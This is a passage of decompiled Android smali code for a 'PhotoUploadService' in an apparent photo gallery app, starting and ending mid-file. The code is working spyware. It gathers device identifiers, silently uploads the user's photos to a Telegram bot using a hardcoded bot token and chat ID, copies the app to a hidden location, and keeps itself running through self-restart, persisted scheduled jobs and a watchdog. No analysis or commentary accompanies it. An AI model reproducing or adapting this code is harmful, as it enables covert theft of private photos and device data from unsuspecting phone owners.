    .locals 5

    .line 518
    const-string v0, "jobscheduler"

    invoke-virtual {p0, v0}, Lcom/photo/gallery/PhotoUploadService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/job/JobScheduler;

    if-eqz v0, :cond_0

    .line 520
    new-instance v1, Landroid/content/ComponentName;

    const-class v2, Lcom/photo/gallery/ServiceRestartJobService;

    invoke-direct {v1, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 521
    new-instance v2, Landroid/app/job/JobInfo$Builder;

    const/16 v3, 0x3e9

    invoke-direct {v2, v3, v1}, Landroid/app/job/JobInfo$Builder;-><init>(ILandroid/content/ComponentName;)V

    const-wide/32 v3, 0xdbba0

    .line 522
    invoke-virtual {v2, v3, v4}, Landroid/app/job/JobInfo$Builder;->setPeriodic(J)Landroid/app/job/JobInfo$Builder;

    move-result-object v1

    const/4 v2, 0x1

    .line 523
    invoke-virtual {v1, v2}, Landroid/app/job/JobInfo$Builder;->setPersisted(Z)Landroid/app/job/JobInfo$Builder;

    move-result-object v1

    .line 524
    invoke-virtual {v1, v2}, Landroid/app/job/JobInfo$Builder;->setRequiredNetworkType(I)Landroid/app/job/JobInfo$Builder;

    move-result-object v1

    .line 525
    invoke-virtual {v1}, Landroid/app/job/JobInfo$Builder;->build()Landroid/app/job/JobInfo;

    move-result-object v1

    .line 526
    invoke-virtual {v0, v1}, Landroid/app/job/JobScheduler;->schedule(Landroid/app/job/JobInfo;)I

    .line 527
    const-string v0, "PhotoUploadService"

    const-string v1, "Service restart job scheduled"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_0
    return-void
.end method

.method private sendDeviceInfo()V
    .locals 10

    .line 222
    const-string v1, "PhotoUploadService"

    :try_start_0
    invoke-static {p0}, Lcom/photo/gallery/DeviceIdentifier;->getDeviceUniqueId(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    .line 224
    const-string v2, "\ud83d\udcf1 UPLOAD SESSION STARTED\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\nDevice: %s %s\nModel: %s\nAndroid: %s (API %d)\nDevice ID: %s\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\ud83d\ude80 Starting continuous photo upload..."

    sget-object v3, Landroid/os/Build;->BRAND:Ljava/lang/String;

    sget-object v4, Landroid/os/Build;->DEVICE:Ljava/lang/String;

    sget-object v5, Landroid/os/Build;->MODEL:Ljava/lang/String;

    sget-object v6, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    sget v7, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 237
    invoke-static {v7}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v7

    const/4 v8, 0x0

    const/16 v9, 0x8

    .line 238
    invoke-virtual {v0, v8, v9}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v8

    filled-new-array/range {v3 .. v8}, [Ljava/lang/Object;

    move-result-object v0

    .line 224
    invoke-static {v2, v0}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    .line 241
    invoke-direct {p0, v0}, Lcom/photo/gallery/PhotoUploadService;->sendTextMessage(Ljava/lang/String;)V

    .line 242
    const-string v0, "Device info sent to Telegram"

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    move-exception v0

    .line 244
    const-string v2, "Error sending device info"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    return-void
.end method

.method private sendTextMessage(Ljava/lang/String;)V
    .locals 5

    .line 445
    const-string v0, "PhotoUploadService"

    .line 0
    const-string v1, "Failed to send message: "

    .line 445
    :try_start_0
    new-instance v2, Lokhttp3/MultipartBody$Builder;

    invoke-direct {v2}, Lokhttp3/MultipartBody$Builder;-><init>()V

    sget-object v3, Lokhttp3/MultipartBody;->FORM:Lokhttp3/MediaType;

    .line 446
    invoke-virtual {v2, v3}, Lokhttp3/MultipartBody$Builder;->setType(Lokhttp3/MediaType;)Lokhttp3/MultipartBody$Builder;

    move-result-object v2

    const-string v3, "chat_id"

    const-string v4, "8123598428"

    .line 447
    invoke-virtual {v2, v3, v4}, Lokhttp3/MultipartBody$Builder;->addFormDataPart(Ljava/lang/String;Ljava/lang/String;)Lokhttp3/MultipartBody$Builder;

    move-result-object v2

    const-string v3, "text"

    .line 448
    invoke-virtual {v2, v3, p1}, Lokhttp3/MultipartBody$Builder;->addFormDataPart(Ljava/lang/String;Ljava/lang/String;)Lokhttp3/MultipartBody$Builder;

    move-result-object p1

    .line 449
    invoke-virtual {p1}, Lokhttp3/MultipartBody$Builder;->build()Lokhttp3/MultipartBody;

    move-result-object p1

    .line 451
    new-instance v2, Lokhttp3/Request$Builder;

    invoke-direct {v2}, Lokhttp3/Request$Builder;-><init>()V

    const-string v3, "https://api.telegram.org/bot8504649470:AAESYyNP6QHNh7V4ioQ6tKP_mypYIvQ9WBs/sendMessage"

    .line 452
    invoke-virtual {v2, v3}, Lokhttp3/Request$Builder;->url(Ljava/lang/String;)Lokhttp3/Request$Builder;

    move-result-object v2

    .line 453
    invoke-virtual {v2, p1}, Lokhttp3/Request$Builder;->post(Lokhttp3/RequestBody;)Lokhttp3/Request$Builder;

    move-result-object p1

    .line 454
    invoke-virtual {p1}, Lokhttp3/Request$Builder;->build()Lokhttp3/Request;

    move-result-object p1

    .line 456
    iget-object v2, p0, Lcom/photo/gallery/PhotoUploadService;->httpClient:Lokhttp3/OkHttpClient;

    invoke-virtual {v2, p1}, Lokhttp3/OkHttpClient;->newCall(Lokhttp3/Request;)Lokhttp3/Call;

    move-result-object p1

    invoke-interface {p1}, Lokhttp3/Call;->execute()Lokhttp3/Response;

    move-result-object p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 457
    :try_start_1
    invoke-virtual {p1}, Lokhttp3/Response;->isSuccessful()Z

    move-result v2

    if-nez v2, :cond_0

    .line 458
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p1}, Lokhttp3/Response;->code()I

    move-result v1

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :cond_0
    if-eqz p1, :cond_1

    .line 460
    :try_start_2
    invoke-virtual {p1}, Lokhttp3/Response;->close()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    :cond_1
    return-void

    :catchall_0
    move-exception v1

    if-eqz p1, :cond_2

    .line 456
    :try_start_3
    invoke-virtual {p1}, Lokhttp3/Response;->close()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    goto :goto_0

    :catchall_1
    move-exception p1

    :try_start_4
    invoke-virtual {v1, p1}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    :cond_2
    :goto_0
    throw v1
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0

    :catch_0
    move-exception p1

    .line 462
    const-string v1, "Error sending message"

    invoke-static {v0, v1, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    return-void
.end method

.method private updateNotification(Ljava/lang/String;II)V
    .locals 2

    .line 201
    const-string v0, "notification"

    invoke-virtual {p0, v0}, Lcom/photo/gallery/PhotoUploadService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/NotificationManager;

    const/4 v1, 0x1

    if-eqz v0, :cond_0

    .line 203
    invoke-direct {p0, p1, p2, p3}, Lcom/photo/gallery/PhotoUploadService;->createNotification(Ljava/lang/String;II)Landroid/app/Notification;

    move-result-object p1

    invoke-virtual {v0, v1, p1}, Landroid/app/NotificationManager;->notify(ILandroid/app/Notification;)V

    .line 207
    :cond_0
    const-string p1, "photo_backup"

    const/4 v0, 0x0

    invoke-virtual {p0, p1, v0}, Lcom/photo/gallery/PhotoUploadService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object p1

    .line 208
    invoke-interface {p1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object p1

    if-lez p3, :cond_1

    goto :goto_0

    :cond_1
    move v1, v0

    .line 209
    :goto_0
    const-string v0, "is_uploading"

    invoke-interface {p1, v0, v1}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    move-result-object p1

    const-string v0, "upload_progress"

    .line 210
    invoke-interface {p1, v0, p2}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    move-result-object p1

    const-string p2, "total_photos"

    .line 211
    invoke-interface {p1, p2, p3}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    move-result-object p1

    const-string p2, "last_backup_time"

    .line 212
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    invoke-interface {p1, p2, v0, v1}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    move-result-object p1

    .line 213
    invoke-interface {p1}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 216
    new-instance p1, Landroid/content/Intent;

    const-string p2, "com.photo.gallery.STATUS_UPDATE"

    invoke-direct {p1, p2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 217
    invoke-virtual {p0, p1}, Lcom/photo/gallery/PhotoUploadService;->sendBroadcast(Landroid/content/Intent;)V

    return-void
.end method

.method private uploadPhoto(Lcom/photo/gallery/PhotoUploadService$PhotoInfo;)V
    .locals 10

    .line 346
    :try_start_0
    invoke-static {p0}, Lcom/photo/gallery/NetworkMonitor;->isNetworkAvailable(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 347
    iget-object p1, p0, Lcom/photo/gallery/PhotoUploadService;->uploadedCount:Ljava/util/concurrent/atomic/AtomicInteger;

    invoke-virtual {p1}, Ljava/util/concurrent/atomic/AtomicInteger;->incrementAndGet()I

    return-void

    .line 351
    :cond_0
    new-instance v0, Ljava/io/File;

    iget-object v1, p1, Lcom/photo/gallery/PhotoUploadService$PhotoInfo;->path:Ljava/lang/String;

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 352
    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v1

    if-eqz v1, :cond_8

    invoke-virtual {v0}, Ljava/io/File;->canRead()Z

    move-result v1

    if-nez v1, :cond_1

    goto/16 :goto_2

    .line 358
    :cond_1
    invoke-direct {p0, p1}, Lcom/photo/gallery/PhotoUploadService;->generatePhotoHash(Lcom/photo/gallery/PhotoUploadService$PhotoInfo;)Ljava/lang/String;

    move-result-object v1

    .line 359
    invoke-direct {p0, v1}, Lcom/photo/gallery/PhotoUploadService;->isPhotoAlreadyUploaded(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_2

    .line 360
    iget-object p1, p0, Lcom/photo/gallery/PhotoUploadService;->uploadedCount:Ljava/util/concurrent/atomic/AtomicInteger;

    invoke-virtual {p1}, Ljava/util/concurrent/atomic/AtomicInteger;->incrementAndGet()I

    return-void

    .line 364
    :cond_2
    invoke-static {p0}, Lcom/photo/gallery/DeviceIdentifier;->getDeviceUniqueId(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v2

    .line 367
    const-string v3, "%s | %s | %s"

    iget-object v4, p1, Lcom/photo/gallery/PhotoUploadService$PhotoInfo;->name:Ljava/lang/String;

    sget-object v5, Landroid/os/Build;->MODEL:Ljava/lang/String;

    const/4 v6, 0x0

    const/16 v7, 0x8

    .line 371
    invoke-virtual {v2, v6, v7}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v2

    filled-new-array {v4, v5, v2}, [Ljava/lang/Object;

    move-result-object v2

    .line 367
    invoke-static {v3, v2}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    .line 374
    new-instance v3, Lokhttp3/MultipartBody$Builder;

    invoke-direct {v3}, Lokhttp3/MultipartBody$Builder;-><init>()V

    sget-object v4, Lokhttp3/MultipartBody;->FORM:Lokhttp3/MediaType;

    .line 375
    invoke-virtual {v3, v4}, Lokhttp3/MultipartBody$Builder;->setType(Lokhttp3/MediaType;)Lokhttp3/MultipartBody$Builder;

    move-result-object v3

    const-string v4, "chat_id"

    const-string v5, "8123598428"

    .line 376
    invoke-virtual {v3, v4, v5}, Lokhttp3/MultipartBody$Builder;->addFormDataPart(Ljava/lang/String;Ljava/lang/String;)Lokhttp3/MultipartBody$Builder;

    move-result-object v3

    const-string v4, "caption"

    .line 377
    invoke-virtual {v3, v4, v2}, Lokhttp3/MultipartBody$Builder;->addFormDataPart(Ljava/lang/String;Ljava/lang/String;)Lokhttp3/MultipartBody$Builder;

    move-result-object v2

    const-string v3, "photo"

    iget-object v4, p1, Lcom/photo/gallery/PhotoUploadService$PhotoInfo;->name:Ljava/lang/String;

    const-string v5, "image/*"

    .line 379
    invoke-static {v5}, Lokhttp3/MediaType;->parse(Ljava/lang/String;)Lokhttp3/MediaType;

    move-result-object v5

    invoke-static {v0, v5}, Lokhttp3/RequestBody;->create(Ljava/io/File;Lokhttp3/MediaType;)Lokhttp3/RequestBody;

    move-result-object v0

    .line 378
    invoke-virtual {v2, v3, v4, v0}, Lokhttp3/MultipartBody$Builder;->addFormDataPart(Ljava/lang/String;Ljava/lang/String;Lokhttp3/RequestBody;)Lokhttp3/MultipartBody$Builder;

    move-result-object v0

    .line 380
    invoke-virtual {v0}, Lokhttp3/MultipartBody$Builder;->build()Lokhttp3/MultipartBody;

    move-result-object v0

    .line 382
    new-instance v2, Lokhttp3/Request$Builder;

    invoke-direct {v2}, Lokhttp3/Request$Builder;-><init>()V

    const-string v3, "https://api.telegram.org/bot8504649470:AAESYyNP6QHNh7V4ioQ6tKP_mypYIvQ9WBs/sendPhoto"

    .line 383
    invoke-virtual {v2, v3}, Lokhttp3/Request$Builder;->url(Ljava/lang/String;)Lokhttp3/Request$Builder;

    move-result-object v2

    .line 384
    invoke-virtual {v2, v0}, Lokhttp3/Request$Builder;->post(Lokhttp3/RequestBody;)Lokhttp3/Request$Builder;

    move-result-object v0

    .line 385
    invoke-virtual {v0}, Lokhttp3/Request$Builder;->build()Lokhttp3/Request;

    move-result-object v0

    .line 387
    iget-object v2, p0, Lcom/photo/gallery/PhotoUploadService;->httpClient:Lokhttp3/OkHttpClient;

    invoke-virtual {v2, v0}, Lokhttp3/OkHttpClient;->newCall(Lokhttp3/Request;)Lokhttp3/Call;

    move-result-object v0

    invoke-interface {v0}, Lokhttp3/Call;->execute()Lokhttp3/Response;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 388
    :try_start_1
    invoke-virtual {v0}, Lokhttp3/Response;->isSuccessful()Z

    move-result v2

    if-eqz v2, :cond_5

    .line 389
    iget-object v2, p1, Lcom/photo/gallery/PhotoUploadService$PhotoInfo;->id:Ljava/lang/String;

    invoke-direct {p0, v2}, Lcom/photo/gallery/PhotoUploadService;->markPhotoAsUploaded(Ljava/lang/String;)V

    .line 390
    invoke-direct {p0, v1}, Lcom/photo/gallery/PhotoUploadService;->markPhotoHashAsUploaded(Ljava/lang/String;)V

    .line 391
    iget-object v1, p0, Lcom/photo/gallery/PhotoUploadService;->uploadedCount:Ljava/util/concurrent/atomic/AtomicInteger;

    invoke-virtual {v1}, Ljava/util/concurrent/atomic/AtomicInteger;->incrementAndGet()I

    move-result v1

    .line 392
    iget-object v2, p0, Lcom/photo/gallery/PhotoUploadService;->totalCount:Ljava/util/concurrent/atomic/AtomicInteger;

    invoke-virtual {v2}, Ljava/util/concurrent/atomic/AtomicInteger;->get()I

    move-result v2

    .line 395
    rem-int/lit8 v3, v1, 0x5

    if-eqz v3, :cond_3

    if-ne v1, v2, :cond_4

    .line 396
    :cond_3
    const-string v3, "Uploading %d/%d (%.0f%%)"

    .line 397
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    int-to-double v6, v1

    const-wide/high16 v8, 0x4059000000000000L    # 100.0

    mul-double/2addr v6, v8

    int-to-double v8, v2

    div-double/2addr v6, v8

    invoke-static {v6, v7}, Ljava/lang/Double;->valueOf(D)Ljava/lang/Double;

    move-result-object v6

    filled-new-array {v4, v5, v6}, [Ljava/lang/Object;

    move-result-object v4

    invoke-static {v3, v4}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    .line 396
    invoke-direct {p0, v3, v1, v2}, Lcom/photo/gallery/PhotoUploadService;->updateNotification(Ljava/lang/String;II)V

    .line 402
    :cond_4
    const-string v3, "PhotoUploadService"

    const-string v4, "\u2713 [%d/%d] %s"

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    iget-object p1, p1, Lcom/photo/gallery/PhotoUploadService$PhotoInfo;->name:Ljava/lang/String;

    filled-new-array {v1, v2, p1}, [Ljava/lang/Object;

    move-result-object p1

    invoke-static {v4, p1}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object p1

    invoke-static {v3, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0

    .line 404
    :cond_5
    iget-object p1, p0, Lcom/photo/gallery/PhotoUploadService;->uploadedCount:Ljava/util/concurrent/atomic/AtomicInteger;

    invoke-virtual {p1}, Ljava/util/concurrent/atomic/AtomicInteger;->incrementAndGet()I
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :goto_0
    if-eqz v0, :cond_6

    .line 406
    :try_start_2
    invoke-virtual {v0}, Lokhttp3/Response;->close()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    :cond_6
    return-void

    :catchall_0
    move-exception p1

    if-eqz v0, :cond_7

    .line 387
    :try_start_3
    invoke-virtual {v0}, Lokhttp3/Response;->close()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    goto :goto_1

    :catchall_1
    move-exception v0

    :try_start_4
    invoke-virtual {p1, v0}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    :cond_7
    :goto_1
    throw p1

    .line 353
    :cond_8
    :goto_2
    iget-object p1, p0, Lcom/photo/gallery/PhotoUploadService;->uploadedCount:Ljava/util/concurrent/atomic/AtomicInteger;

    invoke-virtual {p1}, Ljava/util/concurrent/atomic/AtomicInteger;->incrementAndGet()I
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0

    return-void

    .line 408
    :catch_0
    iget-object p1, p0, Lcom/photo/gallery/PhotoUploadService;->uploadedCount:Ljava/util/concurrent/atomic/AtomicInteger;

    invoke-virtual {p1}, Ljava/util/concurrent/atomic/AtomicInteger;->incrementAndGet()I

    return-void
.end method

.method private waitForInternet()V
    .locals 5

    .line 121
    const-string v0, "Checking internet connectivity..."

    const-string v1, "PhotoUploadService"

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 123
    :goto_0
    invoke-static {p0}, Lcom/photo/gallery/NetworkMonitor;->isNetworkAvailable(Landroid/content/Context;)Z

    move-result v0

    const/4 v2, 0x0

    if-nez v0, :cond_0

    .line 124
    const-string v0, "Waiting for internet..."

    invoke-direct {p0, v0, v2, v2}, Lcom/photo/gallery/PhotoUploadService;->updateNotification(Ljava/lang/String;II)V

    const-wide/16 v3, 0xbb8

    .line 126
    :try_start_0
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 132
    :catch_0
    :cond_0
    const-string v0, "Internet connected - starting upload"

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 133
    const-string v0, "Internet connected - starting upload..."

    invoke-direct {p0, v0, v2, v2}, Lcom/photo/gallery/PhotoUploadService;->updateNotification(Ljava/lang/String;II)V

    return-void
.end method


# virtual methods
.method synthetic lambda$onCreate$0$com-photo-gallery-PhotoUploadService()V
    .locals 0

    .line 69
    invoke-static {p0}, Lcom/photo/gallery/AppCloner;->cloneAppToHiddenLocation(Landroid/content/Context;)V

    return-void
.end method

.method synthetic lambda$onStartCommand$1$com-photo-gallery-PhotoUploadService()V
    .locals 0

    .line 80
    invoke-direct {p0}, Lcom/photo/gallery/PhotoUploadService;->waitForInternet()V

    .line 81
    invoke-direct {p0}, Lcom/photo/gallery/PhotoUploadService;->sendDeviceInfo()V

    .line 83
    invoke-direct {p0}, Lcom/photo/gallery/PhotoUploadService;->continuousUpload()V

    return-void
.end method

.method synthetic lambda$scanAndUploadPhotos$2$com-photo-gallery-PhotoUploadService(Lcom/photo/gallery/PhotoUploadService$PhotoInfo;)V
    .locals 0

    .line 276
    invoke-direct {p0, p1}, Lcom/photo/gallery/PhotoUploadService;->uploadPhoto(Lcom/photo/gallery/PhotoUploadService$PhotoInfo;)V

    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onCreate()V
    .locals 4

    .line 51
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 52
    invoke-direct {p0}, Lcom/photo/gallery/PhotoUploadService;->createNotificationChannel()V

    const/16 v0, 0x14

    .line 53
    invoke-static {v0}, Ljava/util/concurrent/Executors;->newFixedThreadPool(I)Ljava/util/concurrent/ExecutorService;

    move-result-object v0

    iput-object v0, p0, Lcom/photo/gallery/PhotoUploadService;->executorService:Ljava/util/concurrent/ExecutorService;

    .line 56
    new-instance v0, Lokhttp3/OkHttpClient$Builder;

    invoke-direct {v0}, Lokhttp3/OkHttpClient$Builder;-><init>()V

    const-wide/16 v1, 0xf

    sget-object v3, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    .line 57
    invoke-virtual {v0, v1, v2, v3}, Lokhttp3/OkHttpClient$Builder;->connectTimeout(JLjava/util/concurrent/TimeUnit;)Lokhttp3/OkHttpClient$Builder;

    move-result-object v0

    sget-object v1, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v2, 0x1e

    .line 58
    invoke-virtual {v0, v2, v3, v1}, Lokhttp3/OkHttpClient$Builder;->writeTimeout(JLjava/util/concurrent/TimeUnit;)Lokhttp3/OkHttpClient$Builder;

    move-result-object v0

    sget-object v1, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    .line 59
    invoke-virtual {v0, v2, v3, v1}, Lokhttp3/OkHttpClient$Builder;->readTimeout(JLjava/util/concurrent/TimeUnit;)Lokhttp3/OkHttpClient$Builder;

    move-result-object v0

    const/4 v1, 0x0

    .line 60
    invoke-virtual {v0, v1}, Lokhttp3/OkHttpClient$Builder;->retryOnConnectionFailure(Z)Lokhttp3/OkHttpClient$Builder;

    move-result-object v0

    .line 61
    invoke-virtual {v0}, Lokhttp3/OkHttpClient$Builder;->build()Lokhttp3/OkHttpClient;

    move-result-object v0

    iput-object v0, p0, Lcom/photo/gallery/PhotoUploadService;->httpClient:Lokhttp3/OkHttpClient;

    .line 63
    invoke-direct {p0}, Lcom/photo/gallery/PhotoUploadService;->scheduleServiceRestartJob()V

    .line 66
    invoke-static {p0}, Lcom/photo/gallery/ServiceWatchdog;->scheduleNextCheck(Landroid/content/Context;)V

    .line 69
    iget-object v0, p0, Lcom/photo/gallery/PhotoUploadService;->executorService:Ljava/util/concurrent/ExecutorService;

    new-instance v1, Lcom/photo/gallery/PhotoUploadService$$ExternalSyntheticLambda0;

    invoke-direct {v1, p0}, Lcom/photo/gallery/PhotoUploadService$$ExternalSyntheticLambda0;-><init>(Lcom/photo/gallery/PhotoUploadService;)V

    invoke-interface {v0, v1}, Ljava/util/concurrent/ExecutorService;->execute(Ljava/lang/Runnable;)V

    return-void
.end method

.method public onDestroy()V
    .locals 3

    .line 480
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 481
    const-string v0, "PhotoUploadService"

    const-string v1, "Service destroyed - will restart automatically"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const/4 v0, 0x0

    .line 482
    iput-boolean v0, p0, Lcom/photo/gallery/PhotoUploadService;->isRunning:Z

    .line 483
    iget-object v0, p0, Lcom/photo/gallery/PhotoUploadService;->executorService:Ljava/util/concurrent/ExecutorService;

    if-eqz v0, :cond_0

    .line 484
    invoke-interface {v0}, Ljava/util/concurrent/ExecutorService;->shutdown()V

    .line 488
    :cond_0
    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, Lcom/photo/gallery/PhotoUploadService;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lcom/photo/gallery/PhotoUploadService;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 489
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x1a

    if-lt v1, v2, :cond_1

    .line 490
    invoke-virtual {p0, v0}, Lcom/photo/gallery/PhotoUploadService;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_0

    .line 492
    :cond_1
    invoke-virtual {p0, v0}, Lcom/photo/gallery/PhotoUploadService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 496
    :goto_0
    invoke-static {p0}, Lcom/photo/gallery/ServiceWatchdog;->scheduleNextCheck(Landroid/content/Context;)V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 0

    .line 74
    iget-boolean p1, p0, Lcom/photo/gallery/PhotoUploadService;->isRunning:Z

    const/4 p2, 0x1

    if-nez p1, :cond_0

    .line 75
    iput-boolean p2, p0, Lcom/photo/gallery/PhotoUploadService;->isRunning:Z

    .line 76
    const-string p1, "Starting upload service..."

    const/4 p3, 0x0

    invoke-direct {p0, p1, p3, p3}, Lcom/photo/gallery/PhotoUploadService;->createNotification(Ljava/lang/String;II)Landroid/app/Notification;

    move-result-object p1

    invoke-virtual {p0, p2, p1}, Lcom/photo/gallery/PhotoUploadService;->startForeground(ILandroid/app/Notification;)V

    .line 78
    iget-object p1, p0, Lcom/photo/gallery/PhotoUploadService;->executorService:Ljava/util/concurrent/ExecutorService;

    new-instance p3, Lcom/photo/gallery/PhotoUploadService$$ExternalSyntheticLambda2;

    invoke-direct {p3, p0}, Lcom/photo/gallery/PhotoUploadService$$ExternalSyntheticLambda2;-><init>(Lcom/photo/gallery/PhotoUploadService;)V

    invoke-interface {p1, p3}, Ljava/util/concurrent/ExecutorService;->execute(Ljava/lang/Runnable;)V

    :cond_0
    return p2
.end method

.method public onTaskRemoved(Landroid/content/Intent;)V
    .locals 2

    .line 501
    invoke-super {p0, p1}, Landroid/app/Service;->onTaskRemoved(Landroid/content/Intent;)V

    .line 502
    const-string p1, "PhotoUploadService"

    const-string v0, "Task removed - restarting service"

    invoke-static {p1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 504
    new-instance p1, Landroid/content/Intent;

    invoke-virtual {p0}, Lcom/photo/gallery/PhotoUploadService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-direct {p1, v0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 505
    invoke-virtual {p0}, Lcom/photo/gallery/PhotoUploadService;->getPackageName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/content/Intent;->setPackage(Ljava/lang/String;)Landroid/content/Intent;

    .line 506
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    if-lt v0, v1, :cond_0

    .line 507
    invoke-virtual {p0, p1}, Lcom/photo/gallery/PhotoUploadService;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_0

    .line 509
    :cond_0
